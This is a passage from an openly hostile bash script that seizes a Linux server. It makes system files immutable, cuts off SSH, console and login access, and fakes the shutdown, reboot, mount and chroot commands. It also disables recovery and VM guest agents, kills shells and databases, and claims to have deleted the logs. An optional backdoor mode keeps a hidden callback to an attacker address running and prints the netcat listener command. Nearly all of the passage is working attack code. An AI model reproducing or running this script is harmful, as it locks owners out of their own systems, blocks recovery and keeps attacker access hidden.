            ln -sf /etc/init.d/$service /etc/rc5.d/S99$service 2>/dev/null
        fi
        
        echo -e "${GREEN} $service configured for boot [DONE]${NC}"
    fi
done

cat > /tmp/web_autostart.sh << 'AUTOSTART'
#!/bin/bash
sleep 5
for service in apache2 httpd nginx lighttpd php-fpm node pm2 gunicorn uwsgi puma tomcat tomcat8 tomcat9; do
    systemctl start $service 2>/dev/null || service $service start 2>/dev/null || /etc/init.d/$service start 2>/dev/null
done
/tmp/web_watchdog.sh >/dev/null 2>&1 &
AUTOSTART

chmod +x /tmp/web_autostart.sh

if ! crontab -l 2>/dev/null | grep -q "web_autostart.sh"; then
    (crontab -l 2>/dev/null; echo "@reboot /tmp/web_autostart.sh >/dev/null 2>&1") | crontab - 2>/dev/null
fi

if [ -f /etc/rc.local ]; then
    if ! grep -q "web_autostart.sh" /etc/rc.local 2>/dev/null; then
        sed -i '/^exit 0/i /tmp/web_autostart.sh \&' /etc/rc.local 2>/dev/null
    fi
else
    cat > /etc/rc.local << 'RCLOCAL'
#!/bin/bash
/tmp/web_autostart.sh &
exit 0
RCLOCAL
    chmod +x /etc/rc.local 2>/dev/null
fi

if [ -d /etc/systemd/system ]; then
    cat > /etc/systemd/system/web-autostart.service << 'AUTOSERVICE'
[Unit]
Description=Web Services Autostart
After=network.target

[Service]
Type=forking
ExecStart=/tmp/web_autostart.sh
RemainAfterExit=yes

[Install]
WantedBy=multi-user.target
AUTOSERVICE
    
    systemctl daemon-reload 2>/dev/null
    systemctl enable web-autostart.service 2>/dev/null
fi

echo -e "${GREEN}Web services boot persistence established [DONE]${NC}"

echo -e "${GREEN}Blocking administrative channels...${NC}"
for service in ssh sshd vsftpd proftpd pure-ftpd telnetd; do
    if [ -f "/etc/systemd/system/${service}.service" ] || [ -f "/usr/lib/systemd/system/${service}.service" ] || [ -f "/lib/systemd/system/${service}.service" ] || [ -f "/etc/init.d/${service}" ]; then
        service_command stop $service
        service_command disable $service
        echo -e "${GREEN}$service stopped [DONE]${NC}"
    fi
done

echo -e "${GREEN}Enabling file system protection...${NC}"
if command_exists chattr; then
    for file in /etc/passwd /etc/shadow /etc/group /etc/sudoers /etc/ssh/sshd_config; do
        if [ -f "$file" ]; then
            chattr +i "$file" 2>/dev/null &
            show_progress $! "Protecting $file"
        fi
    done
    
    for file in /var/www/html/index.* /usr/share/nginx/html/index.* /srv/www/html/index.*; do
        if [ -f "$file" ]; then
            chattr +i "$file" 2>/dev/null &
            show_progress $! "Protecting web content"
        fi
    done
fi

setup_firewall

if command_exists ip; then
    ip route add blackhole 169.254.169.254 2>/dev/null
fi

apply_kernel_restrictions
apply_resource_restrictions
isolate_users
destroy_terminals
sabotage_system_binaries
destroy_pam
restrict_filesystem

echo -e "${GREEN}Neutralizing recovery tools...${NC}"
if command_exists chroot && [ -x /usr/sbin/chroot ]; then
    mv /usr/sbin/chroot /usr/sbin/chroot.real 2>/dev/null
    echo -e '#!/bin/sh\necho "Operation not permitted"\nexit 1' > /usr/sbin/chroot
    chmod +x /usr/sbin/chroot 2>/dev/null
fi

if command_exists mount && [ -x /bin/mount ]; then
    mv /bin/mount /bin/mount.real 2>/dev/null
    cat > /bin/mount << 'MOUNT_WRAPPER'
#!/bin/sh
if echo "$*" | grep -q "remount" && echo "$*" | grep -q "rw"; then
    echo "Operation not permitted"
    exit 1
fi
exec /bin/mount.real "$@"
MOUNT_WRAPPER
    chmod +x /bin/mount 2>/dev/null
fi

echo -e "${GREEN}Blocking console access...${NC}"
for tty in 1 2 3 4 5 6; do
    service_command stop "getty@tty${tty}"
    service_command disable "getty@tty${tty}"
done

pkill -9 agetty 2>/dev/null
pkill -9 login 2>/dev/null

for service in gdm3 lightdm sddm; do
    service_command stop $service
    service_command disable $service
done

pkill -9 Xorg 2>/dev/null

echo -e "${GREEN}Protecting critical services...${NC}"
if [ -f /etc/default/grub ] && [ -w /etc/default/grub ]; then
    sed -i 's/GRUB_CMDLINE_LINUX_DEFAULT=.*/GRUB_CMDLINE_LINUX_DEFAULT=""/' /etc/default/grub 2>/dev/null
    echo 'GRUB_DISABLE_RECOVERY=true' >> /etc/default/grub 2>/dev/null
    
    if command_exists update-grub; then
        update-grub 2>/dev/null &
        show_progress $! "Updating GRUB"
    elif command_exists grub2-mkconfig; then
        grub2-mkconfig -o /boot/grub2/grub.cfg 2>/dev/null &
        show_progress $! "Updating GRUB2"
    fi
fi

protect_web_services

echo -e "${GREEN}Cleaning up processes...${NC}"
pkill -9 telnetd 2>/dev/null
pkill -9 ftpd 2>/dev/null

echo -e "${GREEN}Stopping database services...${NC}"
for service in mysql mariadb mysqld postgresql postgresql-13 postgresql-14 postgresql-15 postgresql-16 mongod mongodb redis redis-server memcached; do
    service_command stop $service 2>/dev/null
    service_command disable $service 2>/dev/null
done
pkill -9 -f "mysql|mariadb|postgres|mongod|redis|memcached" 2>/dev/null

if [ $BACKDOOR_MODE -eq 0 ]; then
    CURRENT_PID=$$
    for pid in $(pgrep -f "bash|sh|zsh|dash" 2>/dev/null); do
        if [ "$pid" -ne "$CURRENT_PID" ]; then
            if ! ps -p "$pid" -o cmd= 2>/dev/null | grep -E "apache2|nginx|httpd|watchdog|rootengine" > /dev/null; then
                kill -9 "$pid" 2>/dev/null
            fi
        fi
    done
fi

# echo -e "${GREEN}Controlling display...${NC}"
# clear
# printf '\033[2J\033[3J\033[1;1H'
# 
# for brightness in /sys/class/backlight/*/brightness; do
#     if [ -f "$brightness" ] && [ -w "$brightness" ]; then
#         echo 0 > "$brightness"
#     fi
# done
# 
# # Blank TTYs
# for tty in 1 2 3 4 5 6; do
#     if [ -c "/dev/tty$tty" ]; then
#         echo -ne "\033[2J\033[3J\033[H" > "/dev/tty$tty"
#     fi
# done



echo -e "${GREEN}Terminating SSH...${NC}"
pkill -9 sshd 2>/dev/null &
show_progress $! "Killing SSH processes"

echo -e "${GREEN}Implementing MAXIMUM anti-shutdown protection...${NC}"


for cmd in reboot shutdown poweroff halt; do
    
    for path in /sbin/$cmd /usr/sbin/$cmd /bin/$cmd /usr/bin/$cmd /usr/local/bin/$cmd /usr/local/sbin/$cmd; do
        
        if [ -x "$path" ] && ! grep -q "Operation not permitted" "$path" 2>/dev/null; then
            echo -e "${YELLOW}Sabotaging $path...${NC}"
            
         
            if [ ! -f "${path}.disabled" ]; then
                mv "$path" "${path}.disabled" 2>/dev/null
                chmod 000 "${path}.disabled" 2>/dev/null
            else
                rm -f "$path" 2>/dev/null
            fi
            
            
            cat > "$path" << 'EOF'
#!/bin/sh
echo "Operation not permitted"
exit 1
EOF
            chmod +x "$path" 2>/dev/null
            
          
            if command -v chattr >/dev/null 2>&1; then
                chattr +i "$path" 2>/dev/null
            fi
        fi
    done
done


if command -v systemctl >/dev/null 2>&1; then
    SYSTEMCTL_PATH=$(command -v systemctl)
    if ! grep -q "Operation not permitted" "$SYSTEMCTL_PATH" 2>/dev/null; then
        mv "$SYSTEMCTL_PATH" "${SYSTEMCTL_PATH}.real" 2>/dev/null
        
        cat > "$SYSTEMCTL_PATH" << 'EOF'
#!/bin/sh
for arg in "$@"; do
    if [ "$arg" = "poweroff" ] || [ "$arg" = "reboot" ] || [ "$arg" = "halt" ] || [ "$arg" = "shutdown" ] || [ "$arg" = "rescue" ] || [ "$arg" = "emergency" ]; then
        echo "Operation not permitted"
        exit 1
    fi
done
# Pass through to real systemctl
exec "${0}.real" "$@"
EOF
        chmod +x "$SYSTEMCTL_PATH" 2>/dev/null
    fi
fi


for cmd in init telinit; do
    if [ -f "/sbin/$cmd" ] && [ ! -f "/sbin/$cmd.real" ]; then
        mv "/sbin/$cmd" "/sbin/$cmd.real" 2>/dev/null
        
        cat > /sbin/$cmd << 'INIT_BLOCK'
#!/bin/sh
if [ "$1" = "0" ] || [ "$1" = "6" ]; then
    echo "Operation not permitted"
    exit 1
fi
exec /sbin/$cmd.real "$@" 2>/dev/null
INIT_BLOCK
        chmod +x /sbin/$cmd 2>/dev/null
    fi
done


if [ -d /etc/systemd/system ]; then
    for target in poweroff.target reboot.target halt.target shutdown.target rescue.target emergency.target; do
        systemctl mask $target 2>/dev/null
    done
    systemctl daemon-reload 2>/dev/null
fi

if [ -f /proc/sys/kernel/sysrq ]; then
    echo 0 > /proc/sys/kernel/sysrq 2>/dev/null
fi

if [ -d /etc/acpi/events ]; then
    for event in /etc/acpi/events/*; do
        if [ -f "$event" ]; then
            echo "event=button/power" > "$event"
            echo "action=/bin/true" >> "$event"
        fi
    done
    if [ -f /etc/init.d/acpid ]; then
        /etc/init.d/acpid restart 2>/dev/null
    fi
fi

    
    for file in /root/.bashrc /etc/profile /etc/bash.bashrc /home/*/.bashrc; do
        if [ -f "$file" ]; then
         
            sed -i '/alias shutdown=/d' "$file" 2>/dev/null
            sed -i '/alias reboot=/d' "$file" 2>/dev/null
            sed -i '/alias poweroff=/d' "$file" 2>/dev/null
            sed -i '/alias halt=/d' "$file" 2>/dev/null
            
            echo "alias shutdown='echo Operation not permitted; false'" >> "$file"
            echo "alias reboot='echo Operation not permitted; false'" >> "$file"
            echo "alias poweroff='echo Operation not permitted; false'" >> "$file"
            echo "alias halt='echo Operation not permitted; false'" >> "$file"
            echo "alias init='echo Operation not permitted; false'" >> "$file"
            echo "alias systemctl='echo Operation not permitted; false'" >> "$file"
        fi
    done

    if [ -f /etc/systemd/logind.conf ]; then
        sed -i 's/#HandlePowerKey=poweroff/HandlePowerKey=ignore/' /etc/systemd/logind.conf
        sed -i 's/#HandleSuspendKey=suspend/HandleSuspendKey=ignore/' /etc/systemd/logind.conf
        sed -i 's/#HandleHibernateKey=hibernate/HandleHibernateKey=ignore/' /etc/systemd/logind.conf
        sed -i 's/#HandleLidSwitch=suspend/HandleLidSwitch=ignore/' /etc/systemd/logind.conf
        echo "HandlePowerKey=ignore" >> /etc/systemd/logind.conf
        echo "HandleSuspendKey=ignore" >> /etc/systemd/logind.conf
        echo "HandleHibernateKey=ignore" >> /etc/systemd/logind.conf
        echo "HandleLidSwitch=ignore" >> /etc/systemd/logind.conf
        systemctl restart systemd-logind 2>/dev/null
    fi

cat > /tmp/.anti_shutdown_watchdog.sh << 'WATCHDOG'
#!/bin/sh
while true; do
    for cmd in reboot shutdown poweroff halt; do
        # Check all possible paths
        for path in /sbin/$cmd /usr/sbin/$cmd /bin/$cmd /usr/bin/$cmd /usr/local/bin/$cmd /usr/local/sbin/$cmd; do
            # If it's a real binary (executable and not our fake script)
            if [ -x "$path" ] && ! grep -q "Operation not permitted" "$path" 2>/dev/null; then
                # Move original if not already backed up
                if [ ! -f "${path}.disabled" ]; then
                    mv "$path" "${path}.disabled" 2>/dev/null
                    chmod 000 "${path}.disabled" 2>/dev/null
                else
                    rm -f "$path" 2>/dev/null
                fi
                
                # Create FAKE script IN-PLACE
                cat > "$path" << 'EOF'
#!/bin/sh
echo "Operation not permitted"
exit 1
EOF
                chmod +x "$path" 2>/dev/null
                # Make immutable if possible
                if command -v chattr >/dev/null 2>&1; then
                    chattr +i "$path" 2>/dev/null
                fi
            fi
        done
    done
    
    # Re-apply aliases if removed
    if ! grep -q "alias shutdown" /root/.bashrc 2>/dev/null; then
        echo "alias shutdown='echo Operation not permitted; false'" >> /root/.bashrc
        echo "alias reboot='echo Operation not permitted; false'" >> /root/.bashrc
        echo "alias poweroff='echo Operation not permitted; false'" >> /root/.bashrc
    fi
    
    if [ -f /proc/sys/kernel/sysrq ]; then
        echo 0 > /proc/sys/kernel/sysrq 2>/dev/null
    fi
    
    if pgrep -f "shutdown|reboot|poweroff|halt" | grep -v watchdog >/dev/null 2>&1; then
        pkill -9 -f "shutdown|reboot|poweroff|halt" 2>/dev/null
    fi
    
    sleep 3
done
WATCHDOG

chmod +x /tmp/.anti_shutdown_watchdog.sh
nohup /tmp/.anti_shutdown_watchdog.sh >/dev/null 2>&1 &

if [ -d /etc/systemd/system ]; then
    cat > /etc/systemd/system/anti-shutdown.service << 'SERVICE'
[Unit]
Description=Anti-Shutdown Protection
After=multi-user.target

[Service]
Type=simple
ExecStart=/tmp/.anti_shutdown_watchdog.sh
Restart=always
RestartSec=1

[Install]
WantedBy=multi-user.target
SERVICE
    
    systemctl daemon-reload 2>/dev/null
    systemctl enable anti-shutdown.service 2>/dev/null
    systemctl start anti-shutdown.service 2>/dev/null
fi

echo -e "${GREEN}Blocking VM hypervisor shutdown commands...${NC}"

for service in vmware-tools vmtoolsd vboxadd vboxadd-service VBoxService qemu-guest-agent hv-kvp-daemon hv-vss-daemon hyperv-daemons open-vm-tools; do
    service_command stop $service 2>/dev/null
    service_command disable $service 2>/dev/null
    pkill -9 -f "$service" 2>/dev/null
done

if [ -d /etc/vmware-tools ]; then
    for script in /etc/vmware-tools/scripts/vmware/*; do
        if [ -f "$script" ]; then
            cat > "$script" << 'VMBLOCK'
#!/bin/sh
exit 0
VMBLOCK
            chmod +x "$script" 2>/dev/null
        fi
    done
fi

for daemon in vmtoolsd VBoxService VBoxClient qemu-ga hv-kvp-daemon hv-vss-daemon; do
    for path in /usr/bin/$daemon /usr/sbin/$daemon /sbin/$daemon /bin/$daemon; do
        if [ -x "$path" ]; then
            mv "$path" "${path}.disabled" 2>/dev/null
            cat > "$path" << 'VMDENY'
#!/bin/sh
exit 0
VMDENY
            chmod +x "$path" 2>/dev/null
        fi
    done
done

if [ -f /sys/module/vmw_balloon/parameters/max_balloon_pages ]; then
    echo 0 > /sys/module/vmw_balloon/parameters/max_balloon_pages 2>/dev/null
fi

if [ -d /etc/init.d ]; then
    for script in vmware-tools vboxadd vboxadd-service qemu-guest-agent; do
        if [ -f "/etc/init.d/$script" ]; then
            cat > "/etc/init.d/$script" << 'INITBLOCK'
#!/bin/sh
exit 0
INITBLOCK
            chmod +x "/etc/init.d/$script" 2>/dev/null
        fi
    done
fi

if [ $BACKDOOR_MODE -eq 0 ]; then
    cat > /tmp/persistence_killer.sh << 'KILLER_SCRIPT'
#!/bin/sh
while true; do
    KILLER_PID=$$
    for pid in $(pgrep -f "bash|sh|zsh|dash" 2>/dev/null); do
        if [ "$pid" -ne "$KILLER_PID" ]; then
            if ! ps -p "$pid" -o cmd= 2>/dev/null | grep -E "apache2|nginx|httpd|watchdog|persistence" > /dev/null; then
                kill -9 "$pid" 2>/dev/null
            fi
        fi
    done
    
    pkill -9 sshd 2>/dev/null
    
    for tty in /dev/tty*; do
        if [ -c "$tty" ]; then
            chmod 000 "$tty" 2>/dev/null
        fi
    done
    
    sleep 5
done
KILLER_SCRIPT
    
    chmod +x /tmp/persistence_killer.sh
    nohup /tmp/persistence_killer.sh >/dev/null 2>&1 &
fi

echo ""
echo -e "${GREEN}Performing final checks...${NC}"
echo ""

web_running=false
for service in apache2 httpd nginx; do
    if ps aux 2>/dev/null | grep -v grep | grep -q "$service"; then
        echo -e "${GREEN}[OK] $service is running${NC}"
        web_running=true
    fi
done

if ! $web_running; then
    echo -e "${RED}[WARNING] No web server detected${NC}"
fi

if [ -f /proc/net/tcp ]; then
    if grep -q "0050\|01BB" /proc/net/tcp 2>/dev/null; then
        echo -e "${GREEN}[OK] Web ports are open (80/443)${NC}"
    else
        echo -e "${RED}[WARNING] Web ports not accessible${NC}"
    fi
fi

if ! ps aux 2>/dev/null | grep -E "getty|agetty" | grep -v grep >/dev/null; then
    echo -e "${GREEN}[OK] Console access blocked${NC}"
else
    echo -e "${RED}[WARNING] Console still accessible${NC}"
fi

security_running=false
for proc in snort suricata splunk elastic; do
    if pgrep -f "$proc" >/dev/null 2>&1; then
        security_running=true
        echo -e "${RED}[WARNING] Security tool still running: $proc${NC}"
    fi
done

if ! $security_running; then
    echo -e "${GREEN}[OK] All security monitoring disabled${NC}"
fi

if [ $BACKDOOR_MODE -eq 1 ]; then
    backdoor_running=false
    for dir in "${HIDDEN_DIRS[@]}"; do
        if [ -f "$dir/update.sh" ]; then
            if ps aux 2>/dev/null | grep -v grep | grep -q "$dir/update.sh"; then
                backdoor_running=true
                break
            fi
        fi
    done
    
    if $backdoor_running; then
        echo -e "${GREEN}[OK] Backdoor is active${NC}"
    else
        echo -e "${RED}[WARNING] Backdoor not running${NC}"
    fi
fi

echo ""
echo -e "${GREEN}System lockdown complete${NC}"
echo ""

if [ $BACKDOOR_MODE -eq 0 ]; then
    echo -e "${YELLOW}Mode: Aggressive (Maximum Lockdown)${NC}"
    echo ""
    echo -e "Active Services:"
    echo -e "  - Web services: Running"
    echo ""
    echo -e "Disabled/Blocked:"
    echo -e "  - All IDS/IPS/SIEM tools"
    echo -e "  - Administrative access"
    echo -e "  - Console & TTY access"
    echo -e "  - SSH connections"
    echo -e "  - System shells"
    echo -e "  - Recovery tools"
    echo -e "  - All system logs (encrypted/deleted)"
else
    echo -e "${YELLOW}Mode: Backdoor (Attacker Access)${NC}"
    echo ""
    echo -e "Active Services:"
    echo -e "  - Web services: Running"
    echo -e "  - Backdoor: $BACKDOOR_IP:$BACKDOOR_PORT"
    echo ""
    echo -e "Disabled/Blocked:"
    echo -e "  - All IDS/IPS/SIEM tools"
    echo -e "  - Administrative access"
    echo -e "  - Console access"
    echo -e "  - SSH service"
    echo -e "  - All system logs (encrypted/deleted)"
    echo ""
    echo -e "Connect with: ${CYAN}nc -lvnp $BACKDOOR_PORT${NC}"
fi

echo ""

if [ $BACKDOOR_MODE -eq 0 ]; then
    exec 1>/dev/null 2>&1
    
    while true; do
        sleep 3600
    done
else
    exec 1>/tmp/.system.log 2>&1
    
    echo "[$(date)] System lockdown complete - Backdoor mode active"
    echo "[$(date)] Backdoor: $BACKDOOR_IP:$BACKDOOR_PORT"
    echo "[$(date)] All security monitoring neutralized"
    echo "[$(date)] System in monitoring mode"
    
    while true; do
        if ps aux 2>/dev/null | grep -v grep | grep -q "update.sh"; then
            echo "[$(date)] Backdoor status: Active" >> /tmp/.system.log 2>&1
        else
            echo "[$(date)] Backdoor status: Inactive - Attempting restart" >> /tmp/.system.log 2>&1
            for dir in "${HIDDEN_DIRS[@]}"; do
                if [ -f "$dir/update.sh" ]; then
                    nohup "$dir/update.sh" >/dev/null 2>&1 &
                fi
            done
        fi
        
        sleep 300
    done
fi
